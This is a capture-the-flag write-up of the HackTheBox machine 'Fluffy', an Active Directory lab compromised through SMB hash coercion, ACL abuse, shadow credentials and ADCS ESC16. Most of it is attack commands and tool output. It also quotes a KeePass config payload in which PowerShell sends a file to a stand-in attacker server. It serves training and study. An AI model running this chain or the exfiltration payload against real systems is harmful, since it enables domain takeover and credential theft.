---
title: "Fluffy from HackTheBox"
author: ferbot
date: 2025-08-20 22:00:00 +0800
categories: [htb, windows, fluffy]
tags: [htb, windows, easy, cve, adcs, esc16, acl]
description: Assumed breach scenario with realistic abuse leading to ADCS privesc
---

### HTB: Fluffy

This box didn't seem as easy as I first thought it would be but it taught me a valuable lesson about not fully trust my tools and update them to a latest version before I attempt exploitation.

### Initial foothold

When booting on the machine in the HackTheBox panel the following description can be seen:

> As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

This allowed me to start enumerating using this credentials like an assumed breached scenario.

I started with a short nmap scan.

```bash
$ nmap -Pn -sV 10.10.11.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 07:40 EDT
Nmap scan report for 10.10.11.69
Host is up (0.014s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-13 18:40:57Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.12 seconds
```

From this basic scan I noticed a domain name `fluffy.htb` which I used for domain resolution, as well as the machine name `DC01`.

The following line was included `10.10.11.69  fluffy.htb dc01.fluffy.htb` in my `/etc/hosts` file.

Additionally I see active directory services typical from a domain controller like DNS, Kerberos, LDAP and SMB.

### Enumeration as fleischman

I can then use tools such as [netexec](https://github.com/Pennyw0rth/NetExec) to enumerate what kind of resources I have access to as `j.fleischman`.

```bash
$ netexec smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares --users
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain 
SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0        
SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0        
SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0        
SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
SMB         10.10.11.69     445    DC01             [*] Enumerated 9 local users: FLUFFY
```

From the output I can see that our user has READ privileges to several shared folders and WRITE privilege to one IT. In addition I get 9 local users that could be used in further enumeration.

I can use the users and test the password we already have to see if it's being reused.

```bash
$ netexec smb fluffy.htb -u users.txt -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\krbtgt:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\ldap_svc:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\p.agila:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\winrm_svc:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.coffey:J0elTHEM4n1990! STATUS_LOGON_FAILURE 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```

### My first rabbit hole

This was not the case. We can then proceed to explore the `IT` shared folder.

```bash
$ smbclient \\\\fluffy.htb\\IT\\ -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 13 14:50:53 2025
  ..                                  D        0  Sun Jul 13 14:50:53 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

    5842943 blocks of size 4096. 1593599 blocks available
```

Within the IT folder I noticed the `Upgrade_Notice.pdf` file which inside contained information about CVEs and instructions to schedule maintance for these vulnerabilities.

![placeholder](assets/img/htb/fluffy/fluffy-cve.png "Upgrade notice")

In addition the version `2.58` for Keepass was visible which led me to think that this [PoC](https://github.com/alt3kx/CVE-2023-24055_PoC) would have led me to command execution. Inside this PoC there was a way to include a command into the config file of KeePass.

```xml
<Parameter>PowerShell.exe</Parameter>
<Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\John\AppData\Local\Temp\exploit.xml'))) </Parameter>
<Parameter>False</Parameter>
<Parameter>1</Parameter>
```

I initially thought that this was the intended path as the `j.fleischman` user had WRITE privileges over the folder. After it did not work out I tried other type of attacks focused towards Active Directory.

I attempted AS-REP roasting but did not work.

```bash
$ netexec ldap fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --asreproast asrep.txt
LDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out

SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
LDAP        10.10.11.69     389    DC01             [*] Total of records returned 3
LDAP        10.10.11.69     389    DC01             No entries found!
```

I also did Kerberoasting which gave me back hashes to be cracked for the `ca_svc`,`ldap_svc` and `winrm_svc` accounts.

```bash
impacket-GetUserSPNs fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.10.11.69 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-05-19 11:13:22.188468             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$3aa6[...]9dc48
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$092e[...]f07e
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$44[...]9bc
```

We get three hashes for kerberoastable accounts thanks to impacket's **GetUserSPNs**. However I was not able to crack these with `rockyou.txt` as wordlist and `d3ad0ne` as ruleset.


After not getting anything I then enumerated my privileges within the Active Directory environment. I used bloodhound's python collector for this.

```bash
$ bloodhound-python -c All -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --dns-tcp -dc dc01.fluffy.htb -ns 10.10.11.69
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 02S
```

However, the `j.fleischman` user had no weird policies or permissions.

### Upgrade notice

I went back to the upgrade notice and enumerated the CVEs looking for something to exploit. After a bit of google around I found this [blog](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) which pointed to this [PoC](https://github.com/0x6rss/CVE-2025-24071_PoC). This CVE is about windows explorer making an SMB authentication request when a file with `.library-ms` extension is extracted from a compressed file. This means that we can coerce authentication to a server we control and obtain a NetNTLM hash.

I then used the python script from the PoC to create a malicious zip file.

Then using smbclient I uploaded the malicious zip file.

```bash
$ smbclient \\\\fluffy.htb\\IT\\ -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (9.2 kb/s) (average 9.2 kb/s)
smb: \> dir
  .                                   D        0  Thu Jul 17 22:58:51 2025
  ..                                  D        0  Thu Jul 17 22:58:51 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      321  Thu Jul 17 22:58:51 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

    5842943 blocks of size 4096. 1539995 blocks available
smb: \> 
```

I then seted up an SMB server using impacket and listened to incoming authentication requests. After a couple of minutes I got a hit.

```bash
sudo impacket-smbserver -smb2support 'hval' .
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.69,50694)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:601d0cdf646e94e1c1d16b1d04b8e4d3:010100000000000080b2207c45f4db0138045d21b1bb721500000000010010006c0055006f00530050007a0066004f00030010006c0055006f00530050007a0066004f00020010004e005000720072006a00710077007800040010004e005000720072006a007100770078000700080080b2207c45f4db0106000400020000000800300030000000000000000100000000200000fef6647fa1dba33515f939b9660b43d11af6c9bbaf22466fb41c7e44c553fc050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000
[*] Closing down connection (10.10.11.69,50694)
[*] Remaining connections []
```

We got a hash! I can then use hashcat to crack it.

```cmd
> hashcat.exe -a 0 -m 5600 fluffy.hash ..\wordlists\rockyou.txt
```

After a while the following result was given: `prometheusx-303`. I try the credentials and they work.

```bash
netexec smb fluffy.htb -u p.agila -p 'prometheusx-303'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
```

### Thinking in graphs

Happy about getting a new user I went to bloodhound and mark this new user as **Owned**. I then checked what kind of privileges had.

![placeholder](assets/img/htb/fluffy/fluffy-bh1.png "GenericAll privileges")

I noticed the `p.agila` user was member of the `Service Account Managers` group which had `GenericAll` permission on the `Service Accounts` group meaning I could add any user I wanted to that group.

![placeholder](assets/img/htb/fluffy/fluffy-bh1.png "GenericWrite privileges")

In addition any member from the `Service Accounts` group had `GenericWrite` privileges over the users `ca_svc`, `ldap_svc` and `winrm_svc`.

Bloodhound's abuse on Linux makes use of `net rpc` so I follow that.

```bash
$ net rpc group addmem "Service Accounts" "j.fleischman" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

We can also use `net rpc` to verify if the user sucessfully joined the `Service Accounts` group.

```bash
$ net rpc group members "Service Accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\winrm_svc
FLUFFY\j.fleischman
```

User `j.fleischman` is now part of `Service Accounts` group, meaning I can now do a shadow credential attack using `certipy-ad` because anyone from the group has `GenericWrite` privilege on the users. I followed the steps from this [blog](https://i-tracing.com/blog/dacl-shadow-credentials/) to obtain the NT hashes.


```bash
$ certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ca_svc"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '085965fd-8e93-1c97-c5f9-1191c9ae628b'
[*] Adding Key Credential with device ID '085965fd-8e93-1c97-c5f9-1191c9ae628b' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '085965fd-8e93-1c97-c5f9-1191c9ae628b' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
[...]
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

I obtained NT hash for users: `ca_svc`, `ldap_svc` and `winrm_svc`.

Which meant I could now login to fluffy as `winrm_svc`.

```cmd
$ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

### Second rabbit hole

I initially thought of abusing the privilege of having the CA service's NT hash. So I started by enumerating using `certipy-ad`.

```bash
$ certipy-ad find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
[*] Got CA configuration for 'fluffy-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

Initially I found nothing but I will talk about it later in the write-up.

I then used winPEAS to grab possible vectors for privilege escalation. I then jumped into my second rabbit hole attempting to abuse the `SeMachineAccountPrivilege` privilege.

```cmd
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

After googling a bit more I found a [blog](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/) explaining how to abuse this privilege, however I also would need the privilege to add workstations to the domain which by default is in the `MS-DS-Machine-Account-Quota` parameter which defaults to 10.

With the use of `netexec` I can check if this is the case.

```bash
$ netexec ldap fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -M maq
LDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 
MAQ         10.10.11.69     389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.11.69     389    DC01             MachineAccountQuota: 0
```

However this parameter is set to **0** meaning this is not the route to go.

### Privilege escalation

After banging my head for a while I noticed that my certipy-ad was outdated so I decided to update it to a latest release and re-enunemerate the CAs.

```bash
$ certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

This time I got that I could abuse the `ESC16` scenario.

Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) explains this misconfiguration very nicely.

In a nutshell, since the `ca_svc` user has `GenericWrite` privileges to three users, it could change the `userPrincipalName` parameter in the domain. Meaning the upn could be changed to anything, being also set to `administrator` and then a certificate could be requested (default 'User' template enrollment) obtaining the real administrator's pfx.

Then after changing back the upn I could authenticate as administrator using the pfx certificate I got and obtaining the NT hash.

This is a relatively new attack (May 2025) which also explains why I was not able to identify it before.

I then proceeded to use the `ca_svc` privileges to update its own UPN. I tried with the other two users as well but I was getting the error `CERTSRV_E_ENROLL_DENIED` which meants only the `ca_svc` user had the permission to enroll.

```bash
$ certipy account -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

I then confirmed that the UPN was successfully updated.

```bash
$ certipy account -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-16T16:12:54+00:00
```

Sometimes I was getting the following error:

> KRB_AP_ERR_SKEW(Clock skew too great)

So I used `sudo ntpdate fluffy.htb` to fix this, as it's something [other HTB players](https://forum.hackthebox.com/t/how-do-you-synchronize-ad-and-time/318340) have struggled with before.

I then requested the certificate and since the UPN was set to **administrator** it was exactly what I got (thanks ESC16).

```bash
$ certipy req -dc-ip '10.10.11.69' -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

I restored the UPN for ca_svc since I was having problems authenticating.

```bash
$ certipy-ad account -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

And finally I authenticated using the administrator's certificate.

```bash
$ certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da[...]a6e
```

I then was able to obtain the administrator hash and therefor rooted the machine.

